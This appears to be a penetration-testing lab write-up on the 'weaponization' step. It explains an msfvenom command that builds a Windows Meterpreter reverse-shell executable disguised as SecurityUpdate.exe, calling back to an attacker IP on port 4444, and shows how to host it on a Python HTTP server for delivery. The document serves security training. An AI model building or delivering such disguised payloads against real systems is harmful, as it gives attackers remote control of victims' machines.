# Weaponization

## Objective:
Create a malicious payload and a delivery mechanism for the attack.

## Action:
1. Generate Malicious Payload with MSFVenom: 

    Use **MSFVenom**, a tool for creating payloads, to generate a **malicious executable** that executes a **Meterpreter shell** (Metasploit's remote control payload). 

![image](https://github.com/user-attachments/assets/fc6acd6d-1b8f-4dc9-8d76-ab57a5fc4574)

### Explanation of the Command:

  - `msfvenom` – A tool used to generate payloads (malicious code) for penetration testing.
  - `-p windows/meterpreter/reverse_tcp` – This specifies the payload type:
    - `windows/meterpreter/reverse_tcp` creates a **reverse shell**, meaning the victim's machine will connect back to the attacker's system.
  - `LHOST=10.19.19.134` – The attacker's IP address where the victim's machine will connect to.
  - `LPORT=4444` – The port on which the attacker's computer is listening for incoming connections.
  - `-f exe` – Specifies the output format of the payload as a **Windows executable** (`.exe`).
  - `-o SecurityUpdate.exe` – Saves the malicious executable file as `SecurityUpdate.exe`.

## The Output:

- The tool automatically targets **Windows**.
- **x86 (32-bit architecture)** is selected, as no specific architecture was defined.
- The payload is **354 bytes** in size, while the final executable is **73,802 bytes**.
- The malicious file is saved as `SecurityUpdate.exe`.

### What This Means:

When `SecurityUpdate.exe` is executed on a Windows system, it connects back to the attacker's IP (**10.19.19.134:4444**) and provides remote control through the **Meterpreter shell**.


### Verifying the Payload Type:
Use the `file` command to check the type of the generated file (`SecurityUpdate.exe`):

```
 file SecurityUpdate.exe
```
1. `PE32 executable` – This means it is a Portable Executable (PE) file, which is a common format for Windows programs.
2. `(GUI)` – The program is designed to run with a Graphical User Interface (GUI) rather than in the command line (CLI).
3. `Intel 80386` – This indicates the file is built for 32-bit (x86) architecture.
4. `for MS Windows` – The file is meant to run on Microsoft Windows.
5. `4 sections` – The executable has four sections inside it (such as code, data, resources, etc.), which is typical for compiled Windows programs.

This confirms that `SecurityUpdate.exe` is a **32-bit Windows executable** with a GUI. If run, it will execute the embedded Meterpreter payload.

2. Host the Payload Using a Python HTTP Server.

   Host the payload on a **Python HTTP server** running on port `8000`:

![image](https://github.com/user-attachments/assets/1c66b5c9-4f4c-4285-8f5a-d86b5a14c244)

### Command Explanation:

```
python3 -m http.server 8000
```

1. `python3` – Runs Python version 3.
2. `-m http.server` – Uses Python’s built-in web server module to start a temporary HTTP server.
3. `8000` – Specifies that the server should run on port 8000 (you can change this to any available port).

### Output of the Command:

  - `"Serving HTTP on 0.0.0.0 port 8000"` – The server is now running and accessible from any computer on the network.
  - `"http://0.0.0.0:8000/"` – You (or others on the network) can access it by typing http://your-ip:8000/ in a web browser.

### What This Means:

  - If you run this command in a folder, Python will share all the files in that folder over HTTP.
  - You can download files from this machine by visiting `http://your-ip:8000/` in a browser or using `wget` or `curl`.
  - Useful for quick file sharing or setting up a local web server for testing.
